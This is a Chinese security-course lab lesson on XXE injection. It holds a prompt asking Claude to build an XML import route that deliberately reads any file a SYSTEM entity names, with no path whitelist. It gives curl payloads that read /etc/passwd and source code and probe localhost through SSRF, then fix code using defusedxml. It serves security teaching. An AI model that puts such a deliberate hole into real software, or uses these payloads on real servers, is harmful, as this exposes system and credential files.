# Day 10 - XXE 外部实体注入漏洞

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已有的所有功能基础上，继续增加 XML 数据导入功能。保持原有功能不变。

### 在 app.py 中新增以下内容：

1. 新增导入：import re, json

2. 新增路由 /xml-import，支持 GET 和 POST：
   - 需要登录才能访问（未登录时跳转到登录页）
   - GET 请求显示 XML 导入页面 xml_import.html
   - POST 请求从表单接收 xml_data 参数
   - 检查 XML 中是否有 <!ENTITY 定义，如果有则提取 SYSTEM 后面的文件路径
   - 读取该文件的内容，替换 XML 中的实体引用
   - 解析替换后的 XML，提取 user 节点的 name 和 email
   - 用 JSON 格式返回解析结果
   - 如果解析失败则返回错误信息

### 新增 templates/xml_import.html

XML 导入页面，继承 base.html，包含：
- 多行文本编辑框用于输入 XML 数据
- "导入"按钮
- 解析结果显示区域（pre 标签显示 JSON）

### 修改 templates/base.html

- 在导航栏登录后的菜单中添加"XML导入"链接

### 代码规范要求
- 检测 XML 中的 <!ENTITY 和 SYSTEM 关键字
- 提取文件路径并读取本地文件
- 将文件内容替换到 &xxe; 实体引用位置
- 不对文件路径做白名单校验
- 解析结果直接返回给用户

生成全部代码后告诉我，我复制覆盖到本地项目中。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 增加 XML 数据导入功能 |
| 2 | Claude 生成后，覆盖 app.py 和 templates | 保持原有功能不变 |
| 3 | 终端运行 `python app.py` | 启动项目 |
| 4 | 用 curl 测试 XXE 漏洞 | 见下方 POC |
| 5 | 分析代码，编写修复到 fix/xml_processor_fix.py | 修复漏洞 |
| 6 | `git add -A && git commit -m "day-10: XML导入 + XXE修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞：XXE（XML 外部实体注入）

```python
# 检测 XML 中的实体定义
if '<!ENTITY' in xml_data and 'SYSTEM' in xml_data:
    entity_match = re.search(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"', xml_data)
    if entity_match:
        entity_name = entity_match.group(1)   # xxe
        file_path = entity_match.group(2)     # file:///etc/passwd
        # 读取本地文件！
        with open(file_path.replace('file://', ''), 'r') as f:
            file_content = f.read()
        # 替换实体引用
        xml_data = xml_data.replace(f'&{entity_name};', file_content)
```

**问题**：
- 检测到 `<!ENTITY ... SYSTEM ...>` 后，主动读取外部实体指向的文件
- 将文件内容插入到 XML 中并解析
- 没有限制可读取的文件路径

---

## 四、POC 代码

### POC 1：读取系统文件 /etc/passwd

```bash
curl http://127.0.0.1:5000/xml-import -b /tmp/cookies.txt --data-urlencode "xml_data=<?xml version='1.0'?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
<root>
  <user>
    <name>&xxe;</name>
    <email>t@t.com</email>
  </user>
</root>"
```

**预期结果**：返回 JSON 中 name 字段为 /etc/passwd 的内容（包含 root:x）。

### POC 2：读取项目源码

```bash
curl http://127.0.0.1:5000/xml-import -b /tmp/cookies.txt --data-urlencode "xml_data=<?xml version='1.0'?>
<!ENTITY xxe SYSTEM 'file:///path/to/app.py'>
<root><user><name>&xxe;</name></user></root>"
```

### POC 3：XXE + SSRF 组合内网探测

```bash
curl http://127.0.0.1:5000/xml-import -b /tmp/cookies.txt --data-urlencode "xml_data=<?xml version='1.0'?>
<!ENTITY xxe SYSTEM 'http://127.0.0.1:5000/'>
<root><user><name>&xxe;</name></user></root>"
```

---

## 五、POC 代码详细解释

### XML 结构分析

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [                ← DTD 声明
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  ← 外部实体定义
]>                              xxe = /etc/passwd 的内容
<root>
  <user>
    <name>&xxe;</name>         ← 实体引用，替换为文件内容
  </user>
</root>
```

### 攻击流程

```
1. 用户提交含外部实体的 XML

2. 服务器解析 XML:
   - 检测到 <!ENTITY xxe SYSTEM "file:///etc/passwd">
   - 提取 entity_name = "xxe", file_path = "file:///etc/passwd"
   - 读取 /etc/passwd 的内容
   - 替换 &xxe; 为文件内容

3. 解析结果返回给用户
   {"name": "root:x:0:0:root:/root:/bin/bash\n..."}
```

---

## 六、修复方案

创建 `fix/xml_processor_fix.py`：

```python
def parse_xml_fixed(xml_data):
    """修复：禁用外部实体"""

    # 修复：检测并阻止外部实体
    if '<!ENTITY' in xml_data and 'SYSTEM' in xml_data:
        return {"error": "外部实体不被允许"}

    # 使用安全方式解析
    import xml.etree.ElementTree as ET
    try:
        root = ET.fromstring(xml_data)
        users = []
        for user in root.findall('.//user'):
            name = user.findtext('name', '')
            email = user.findtext('email', '')
            users.append({"name": name, "email": email})
        return {"users": users}
    except Exception as e:
        return {"error": str(e)}
```

更好的方式：使用 `defusedxml` 库

```python
# pip install defusedxml
from defusedxml import ElementTree as DET

def parse_xml_secure(xml_data):
    """使用 defusedxml 防御所有 XML 攻击"""
    tree = DET.fromstring(xml_data)
    # ... 正常解析，defusedxml 自动防御 XXE
```

---

## 七、漏洞复现检查清单

| # | 检查项 | curl 命令 | 预期结果 |
|---|--------|----------|---------|
| 1 | 读取 /etc/passwd | file:///etc/passwd | 显示 root:x |
| 2 | 读取源码 | file:///app.py | 显示代码 |
| 3 | 内网探测 | http://127.0.0.1:5000 | 显示首页内容 |

---

## 八、课后任务

1. 构造 XXE payload 读取 /etc/passwd
2. 尝试读取项目中的其他文件
3. 在 fix/ 目录下编写修复代码
4. 验证修复后外部实体被阻止
5. （进阶）了解 Billion Laughs 攻击（实体扩展 DoS）
6. 提交到自己的个人分支
